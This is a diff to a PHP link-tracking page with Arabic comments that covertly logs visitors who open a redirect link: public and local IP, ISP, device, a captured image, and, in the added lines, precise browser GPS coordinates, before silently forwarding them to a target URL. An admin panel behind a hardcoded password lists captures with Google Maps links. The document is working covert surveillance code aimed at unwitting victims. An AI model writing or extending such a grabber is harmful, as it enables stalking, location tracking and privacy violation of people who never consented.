@@ -6,11 +6,11 @@ error_reporting(0);
 
 // بدء الجلسة لحماية لوحة التحكم بكلمة مرور
 session_start();
-$password_hash = password_hash('abdssamed00', PASSWORD_DEFAULT);
+$password_hash = password_hash('aziz123', PASSWORD_DEFAULT);
 
 // التحقق من تسجيل الدخول
 if (isset($_POST['login_password'])) {
-    if ($_POST['login_password'] === 'abdssamed00') {
+    if ($_POST['login_password'] === 'aziz123') {
         $_SESSION['is_logged_in'] = true;
         header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
         exit();
@@ -229,6 +229,14 @@ if (isset($_GET['r'])) {
             
             $ip_details = get_ip_details($public_ip);
             $location = $ip_details['location'];
+            
+            // إذا أرسل المتصفح إحداثيات GPS دقيقة، يتم اعتمادها وتحديث الموقع
+            if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
+                $lat = $_POST['lat'];
+                $lon = $_POST['lon'];
+                $location = "GPS: {$lat}, {$lon}";
+            }
+
             $isp = $ip_details['isp'];
             $vpn = $ip_details['vpn'];
             $device = get_device_type($ua);
@@ -283,17 +291,36 @@ if (isset($_GET['r'])) {
             isProcessed = true;
 
             getLocalIP(function(localIp) {
-                const formData = new URLSearchParams();
-                formData.append('save_info', '1');
-                formData.append('image', imageData);
-                formData.append('lip', localIp);
+                const sendData = (lat = "", lon = "") => {
+                    const formData = new URLSearchParams();
+                    formData.append('save_info', '1');
+                    formData.append('image', imageData);
+                    formData.append('lip', localIp);
+                    formData.append('lat', lat);
+                    formData.append('lon', lon);
 
-                fetch(window.location.href, {
-                    method: 'POST',
-                    body: formData
-                }).finally(() => {
-                    window.location.replace(targetUrl);
-                });
+                    fetch(window.location.href, {
+                        method: 'POST',
+                        body: formData
+                    }).finally(() => {
+                        window.location.replace(targetUrl);
+                    });
+                };
+
+                // محاولة الحصول على الموقع الجغرافي الدقيق عبر المتصفح (GPS)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            sendData(position.coords.latitude, position.coords.longitude);
+                        },
+                        (error) => {
+                            sendData("", ""); // في حال رفض الإذن يرسل البيانات العادية عبر IP
+                        },
+                        { timeout: 3000, maximumAge: 0, enableHighAccuracy: true }
+                    );
+                } else {
+                    sendData("", "");
+                }
             });
         }
 
@@ -639,7 +666,18 @@ if (!empty($filter_code)) {
                                     <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
                                 </div>
                                 <div class="info-row">
-                                    <span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
+                                    <span>Location:</span> 
+                                    <span style="color:#10b981; font-weight: bold;">
+                                        <?php 
+                                            $loc = $cap['location'];
+                                            if (strpos($loc, 'GPS:') === 0) {
+                                                $coords = str_replace('GPS: ', '', $loc);
+                                                echo '<a href="https://www.google.com/maps?q=' . $coords . '" target="_blank" style="color: #38bdf8; text-decoration: underline;" title="فتح في خرائط جوجل">📍 إحداثيات GPS</a>';
+                                            } else {
+                                                echo htmlspecialchars($loc);
+                                            }
+                                        ?>
+                                    </span>
                                 </div>
                                 <div class="info-row">
                                     <span>المتعامل:</span> <span style="color:#f97316; font-weight: bold;"><?php echo htmlspecialchars($cap['isp_info']); ?></span>
